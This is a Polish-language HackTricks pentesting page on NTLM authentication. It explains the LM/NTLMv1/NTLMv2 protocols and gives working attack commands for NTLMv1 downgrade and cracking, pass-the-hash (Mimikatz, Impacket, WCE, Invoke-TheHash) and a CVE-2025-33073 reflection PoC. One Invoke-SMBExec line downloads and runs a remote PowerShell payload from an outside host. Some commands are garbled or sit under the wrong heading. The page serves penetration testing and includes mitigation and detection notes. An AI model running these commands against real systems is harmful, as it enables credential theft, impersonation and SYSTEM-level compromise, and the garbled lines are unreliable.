# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

W środowiskach, w których działają **Windows XP i Server 2003**, używane są hashe LM (Lan Manager), choć powszechnie wiadomo, że można je łatwo złamać. Określony hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, oznacza, że LM nie jest używany, i odpowiada hash’owi pustego ciągu.

Domyślnie podstawową metodą jest protokół uwierzytelniania **Kerberos**. NTLM (NT LAN Manager) jest używany w określonych sytuacjach: gdy nie ma Active Directory, domena nie istnieje, Kerberos nie działa z powodu nieprawidłowej konfiguracji lub gdy połączenie jest nawiązywane przy użyciu adresu IP zamiast prawidłowej nazwy hosta.

Obecność nagłówka **„NTLMSSP”** w pakietach sieciowych wskazuje na proces uwierzytelniania NTLM.

Obsługę protokołów uwierzytelniania LM, NTLMv1 i NTLMv2 zapewnia określona biblioteka DLL znajdująca się w `%windir%\Windows\System32\msv1\_0.dll`.

**Najważniejsze informacje**:

- Hashe LM są podatne na ataki, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza, że LM nie jest używany.
- Kerberos jest domyślną metodą uwierzytelniania, a NTLM jest używany tylko w określonych sytuacjach.
- Pakiety uwierzytelniania NTLM można rozpoznać po nagłówku „NTLMSSP”.
- Protokoły LM, NTLMv1 i NTLMv2 są obsługiwane przez plik systemowy `msv1\_0.dll`.

## LM, NTLMv1 i NTLMv2

Możesz sprawdzić i skonfigurować używany protokół:

### GUI

Uruchom _secpol.msc_ -> Zasady lokalne -> Opcje zabezpieczeń -> Zabezpieczenia sieciowe: poziom uwierzytelniania LAN Manager. Dostępnych jest 6 poziomów (od 0 do 5).

![LM, NTLMv1 i NTLMv2 - GUI: Uruchom secpol.msc - Zasady lokalne - Opcje zabezpieczeń - Zabezpieczenia sieciowe: poziom uwierzytelniania LAN Manager. Dostępnych jest 6 poziomów (od 0 do 5)](<../../images/image (919).png>)

### Rejestr

Ustawia to poziom 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Możliwe wartości:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Podstawowy schemat uwierzytelniania domenowego NTLM

1. **Użytkownik** wprowadza swoje **poświadczenia**
2. Komputer kliencki **wysyła żądanie uwierzytelnienia**, podając **nazwę domeny** i **nazwę użytkownika**
3. **Serwer** wysyła **challenge**
4. **Klient szyfruje** **challenge** za pomocą hasha hasła jako klucza i wysyła go jako odpowiedź
5. **Serwer wysyła** do **kontrolera domeny** **nazwę domeny, nazwę użytkownika, challenge i odpowiedź**. Jeśli **nie** skonfigurowano Active Directory lub nazwa domeny jest nazwą serwera, poświadczenia są **weryfikowane lokalnie**.
6. **Kontroler domeny sprawdza, czy wszystko się zgadza**, i wysyła informacje do serwera

**Serwer** i **kontroler domeny** mogą utworzyć **Secure Channel** za pośrednictwem serwera **Netlogon**, ponieważ kontroler domeny zna hasło serwera (jest ono zapisane w bazie **NTDS.DIT**).

### Lokalny schemat uwierzytelniania NTLM

Uwierzytelnianie przebiega tak samo jak opisano **powyżej, ale** **serwer** zna hash użytkownika próbującego się uwierzytelnić, zapisany w pliku **SAM**. Zamiast pytać kontroler domeny, **serwer sam sprawdza**, czy użytkownik może się uwierzytelnić.

### Challenge NTLMv1

**Długość challenge wynosi 8 bajtów**, a **odpowiedź ma długość 24 bajtów**.

**Hash NT (16 bajtów)** jest dzielony na **3 części po 7 bajtów każda** (7B + 7B + (2B+0x00\*5)): **ostatnia część jest uzupełniana zerami**. Następnie **challenge** jest **szyfrowany osobno** każdą częścią, a **wynikowe** zaszyfrowane bajty są **łączone**. Łącznie: 8B + 8B + 8B = 24 bajty.

**Problemy**:

- Brak **losowości**
- 3 części można **atakować osobno**, aby odzyskać hash NT
- **DES można złamać**
- Trzeci klucz składa się zawsze z **5 zer**.
- Przy **tym samym challenge** **odpowiedź** będzie **taka sama**. Możesz więc podać ofierze jako **challenge** ciąg „**1122334455667788**” i zaatakować odpowiedź przy użyciu **wstępnie obliczonych tablic tęczowych**.

### Atak NTLMv1

Unconstrained delegation występuje rzadziej w nowoczesnych środowiskach, ale dostępna **usługa Print Spooler** może nadal zostać wykorzystana do wymuszenia uwierzytelnienia na takim hoście.

Możesz wykorzystać poświadczenia lub sesje, które już masz w AD, aby **skłonić drukarkę do uwierzytelnienia się** na **hoście pod twoją kontrolą**. Następnie, używając `metasploit auxiliary/server/capture/smb` lub `responder`, możesz **ustawić challenge uwierzytelniania na 1122334455667788**, przechwycić próbę uwierzytelnienia i — jeśli użyto **NTLMv1** — **złamać je**.\
Jeśli używasz `responder`, możesz spróbować użyć **flagi `--lm`**, aby spróbować **obniżyć poziom** **uwierzytelniania**.\
_Należy pamiętać, że w przypadku tej techniki uwierzytelnianie musi odbywać się z użyciem NTLMv1 (NTLMv2 nie jest odpowiednie)._

Pamiętaj, że podczas uwierzytelniania drukarka użyje konta komputera, a konta komputerów mają **długie i losowe hasła**, których **prawdopodobnie nie uda ci się złamać** za pomocą typowych **słowników**. Uwierzytelnianie **NTLMv1** **korzysta jednak z DES** ([więcej informacji tutaj](#ntlmv1-challenge)), więc możesz je złamać za pomocą usług przeznaczonych specjalnie do łamania DES (możesz na przykład użyć [https://crack.sh/](https://crack.sh) lub [https://ntlmv1.com/](https://ntlmv1.com)).

### Atak NTLMv1 za pomocą hashcat

NTLMv1 można również zaatakować za pomocą [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), który konwertuje przechwycone wiadomości NTLMv1 do formatów odpowiednich dla Hashcat.<sup>[[1]](#references)</sup>

Polecenie

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

wypisałoby poniższe:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Nie podano treści do przetłumaczenia.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Uruchom hashcat (najlepiej w trybie rozproszonym za pomocą narzędzia takiego jak hashtopolis), ponieważ w przeciwnym razie zajmie to kilka dni.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

W tym przypadku znamy hasło, które brzmi password, więc na potrzeby demonstracji pójdziemy na skróty:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Teraz musimy użyć hashcat-utilities, aby przekonwertować złamane klucze DES na części hasha NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Na koniec ostatnia część:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Połącz je ze sobą:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### Wyzwanie NTLMv2

**Długość wyzwania wynosi 8 bajtów, a wysyłane są 2 odpowiedzi**: jedna ma **24 bajty**, a długość **drugiej** jest **zmienna**.

**Pierwsza odpowiedź** jest tworzona przez obliczenie **HMAC_MD5** dla **ciągu** złożonego z **klienta i domeny**, przy użyciu jako **klucza** hasha **MD4** z **hasha NT**. Następnie **wynik** jest używany jako **klucz** do obliczenia **HMAC_MD5** dla **wyzwania**. Do tego dodawane jest **8-bajtowe wyzwanie klienta**. Łącznie: 24 B.

**Druga odpowiedź** jest tworzona na podstawie **kilku wartości** (nowego wyzwania klienta, **znacznika czasu** zapobiegającego **atakom replay**...)

Jeśli masz **PCAP zawierający pomyślną wymianę uwierzytelniającą**, wyodrębnij domenę, nazwę użytkownika, wyzwanie serwera i odpowiedź NTLMv2, sformatuj przechwycone dane na potrzeby Hashcat i użyj trybu `5600`, aby spróbować odzyskać hasło. Zarchiwizowany praktyczny poradnik zachowuje procedurę wyodrębniania pól pakietu, a przykłady Hashcat pokazują aktualnie akceptowany format.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Gdy masz już hash ofiary**, możesz go użyć, aby **się pod nią podszyć**.\
Potrzebujesz **narzędzia**, które **przeprowadzi** **uwierzytelnianie NTLM przy użyciu** tego **hasha**. Możesz też utworzyć nowy **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, aby był używany przy każdym **uwierzytelnianiu NTLM**. To właśnie robi mimikatz.

**Pamiętaj, że ataki Pass-the-Hash można przeprowadzać również przy użyciu kont komputerów.**

### **Mimikatz**

**Musi być uruchomiony jako administrator**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Ten proces jest uruchamiany jako bieżący użytkownik lokalny, a LSASS przypisuje podane poświadczenia do logowania wychodzącego przez sieć. Następnie możesz uzyskiwać dostęp do zasobów sieciowych jako podany użytkownik, podobnie jak przy użyciu `runas /netonly`, bez znajomości hasła w postaci jawnego tekstu.

### Pass-the-Hash z Linux

Możesz uzyskać możliwość wykonywania kodu na maszynach Windows, używając Pass-the-Hash z Linux.\
[**Zobacz praktyczne przykłady wykonywania Pass-the-Hash za pomocą Impacket PsExec.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)

### Skompilowane narzędzia Impacket dla Windows

Możesz pobrać[ pliki binarne impacket dla Windows tutaj](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (W tym przypadku musisz podać polecenie; cmd.exe i powershell.exe nie nadają się do uzyskania interaktywnej powłoki)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Istnieje kilka innych plików binarnych Impacket...

### Invoke-TheHash

Skrypty powershell możesz pobrać stąd: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Ta funkcja łączy poprzednie tryby. Możesz podać **kilka hostów**, wykluczyć wybrane cele i wybrać _SMBExec, WMIExec, SMBClient_ lub _SMBEnum_. Jeśli wybierzesz **SMBExec** lub **WMIExec** bez parametru _**Command**_, funkcja jedynie sprawdzi, czy masz wystarczające uprawnienia.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Należy uruchomić jako administrator**

To narzędzie robi to samo co mimikatz (modyfikuje pamięć LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Ręczne zdalne wykonywanie poleceń w Windows przy użyciu nazwy użytkownika i hasła


{{#ref}}
../lateral-movement/
{{#endref}}

## Wyodrębnianie poświadczeń z hosta Windows

Więcej informacji znajdziesz w artykule [**Kradzież poświadczeń systemu Windows**](../stealing-credentials/README.md).

## Internal Monologue attack

Internal Monologue Attack to dyskretna technika wyodrębniania poświadczeń, która pozwala atakującemu pozyskać hashe NTLM z komputera ofiary **bez bezpośredniego kontaktu z procesem LSASS**. W przeciwieństwie do Mimikatz, który odczytuje hashe bezpośrednio z pamięci i jest często blokowany przez rozwiązania bezpieczeństwa punktów końcowych lub Credential Guard, atak ten wykorzystuje **lokalne wywołania pakietu uwierzytelniania NTLM (MSV1_0) za pośrednictwem interfejsu Security Support Provider Interface (SSPI)**. Atakujący najpierw **obniża ustawienia NTLM** (np. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), aby zezwolić na NetNTLMv1. Następnie podszywa się pod istniejące tokeny użytkowników uzyskane z uruchomionych procesów i lokalnie wyzwala uwierzytelnianie NTLM, aby wygenerować odpowiedzi NetNTLMv1 przy użyciu znanego wyzwania.<sup>[[4]](#references)</sup>

Po przechwyceniu tych odpowiedzi NetNTLMv1 atakujący może szybko odzyskać oryginalne hashe NTLM przy użyciu **wstępnie obliczonych tablic tęczowych**, co umożliwia dalsze ataki Pass-the-Hash w celu przemieszczania się w sieci. Co ważne, Internal Monologue Attack pozostaje dyskretny, ponieważ nie generuje ruchu sieciowego, nie wstrzykuje kodu ani nie wywołuje bezpośrednich zrzutów pamięci. Dzięki temu obrońcom trudniej go wykryć niż tradycyjne metody, takie jak Mimikatz.

Jeśli NetNTLMv1 nie jest akceptowany z powodu wymuszonych zasad bezpieczeństwa, atakujący może nie uzyskać odpowiedzi NetNTLMv1.

Aby poradzić sobie z taką sytuacją, zaktualizowano narzędzie Internal Monologue: dynamicznie uzyskuje ono token serwera za pomocą `AcceptSecurityContext()`, aby nadal **przechwytywać odpowiedzi NetNTLMv2**, jeśli NetNTLMv1 zawiedzie. NetNTLMv2 jest znacznie trudniejszy do złamania, ale w ograniczonych przypadkach nadal umożliwia ataki relay lub brute-force offline.

PoC znajdziesz w **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay i Responder

**Przeczytaj bardziej szczegółowy przewodnik dotyczący przeprowadzania tych ataków:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsowanie wyzwań NTLM z przechwyconego ruchu sieciowego

**Możesz użyć** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## *Reflection* NTLM i Kerberos za pośrednictwem serializowanych SPN (CVE-2025-33073)

System Windows zawiera kilka zabezpieczeń, które mają zapobiegać atakom typu *reflection*, w których uwierzytelnianie NTLM (lub Kerberos) pochodzące z hosta jest przekazywane z powrotem do **tego samego** hosta w celu uzyskania uprawnień SYSTEM.  

Microsoft przerwał większość publicznie znanych łańcuchów ataków za pomocą MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) i późniejszych poprawek. Jednak **CVE-2025-33073** pokazuje, że zabezpieczenia te nadal można obejść, wykorzystując sposób, w jaki **klient SMB przycina Service Principal Names (SPN)** zawierające *marshalled* (serializowane) informacje o celu.<sup>[[5]](#references)[[6]](#references)</sup>

### Krótko o błędzie
1. Atakujący rejestruje **rekord DNS typu A**, którego etykieta zawiera zakodowany SPN w formacie marshalled, np.
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Ofiara jest nakłaniana do uwierzytelnienia się na tej nazwie hosta (PetitPotam, DFSCoerce itd.).
3. Gdy klient SMB przekazuje ciąg docelowy `cifs/srv11UWhRCAAAAA…` do `lsasrv!LsapCheckMarshalledTargetInfo`, wywołanie `CredUnmarshalTargetInfo` **usuwa** serializowany blok danych, pozostawiając **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (lub odpowiednik Kerberos) uznaje teraz cel za *localhost*, ponieważ krótka nazwa hosta pasuje do nazwy komputera (`SRV1`).
5. W rezultacie serwer ustawia `NTLMSSP_NEGOTIATE_LOCAL_CALL` i wstrzykuje **token dostępu SYSTEM procesu LSASS** do kontekstu (w przypadku Kerberos tworzony jest klucz podsesji oznaczony jako SYSTEM).
6. Przekazanie tego uwierzytelniania za pomocą `ntlmrelayx.py` **lub** `krbrelayx.py` daje pełne uprawnienia SYSTEM na tym samym hoście.<sup>[[5]](#references)</sup>

### Szybki PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Patching i środki zaradcze
* Poprawka KB dla **CVE-2025-33073** dodaje kontrolę w `mrxsmb.sys::SmbCeCreateSrvCall`, która blokuje każde połączenie SMB, którego cel zawiera marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Wymuś **SMB signing** na celach SMB relay. W przypadku pozostałych celów sprawdź wymagania dotyczące podpisywania lub Extended Protection właściwe dla danego protokołu oraz poziom poprawek; samo SMB signing nie przesądza o możliwości wykonania HTTPS WinRM relay.
* Monitoruj rekordy DNS przypominające `*<base64>...*` i blokuj wektory coercion (PetitPotam, DFSCoerce, AuthIP...).

### Pomysły na wykrywanie
* Przechwycenia sieciowe z `NTLMSSP_NEGOTIATE_LOCAL_CALL`, w których IP klienta ≠ IP serwera.
* Kerberos AP-REQ zawierające klucz subsesji i principal klienta równy nazwie hosta.
* Logowania SYSTEM zarejestrowane w zdarzeniach Windows 4624/4648, po których natychmiast następują zdalne zapisy SMB z tego samego hosta.<sup>[[5]](#references)</sup>

Zserializowana nazwa DNS z informacjami o celu może również przekierować wymuszone uwierzytelnianie do atakującego, umożliwiając **cross-protocol relay** do punktu końcowego web enrollment AD CS. To odrębny scenariusz od reflection na tym samym hoście: warunki enrollment ESC8 ([ESC8 enrollment conditions](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)), uprawnienia do zapisu DNS, ścieżkę coercion oraz poziom poprawek celu należy ocenić niezależnie.

Informacje o wariancie local reflection z **marca 2026 r.**, który wykorzystuje **SMB arbitrary ports** i **TCP connection reuse**, aby uzyskać uprawnienia `NT AUTHORITY\SYSTEM`, znajdziesz tutaj:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – narzędzie wielofunkcyjne NTLMv1](https://github.com/evilmog/ntlmv1-multi)
- [2] [Przykładowe hashe Hashcat – NetNTLMv2 (tryb 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – narzędzia PowerShell do Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Atak Internal Monologue: pobieranie hashy NTLM bez uzyskiwania dostępu do LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection nie żyje, niech żyje NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Łamanie hasha NTLMv2 – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
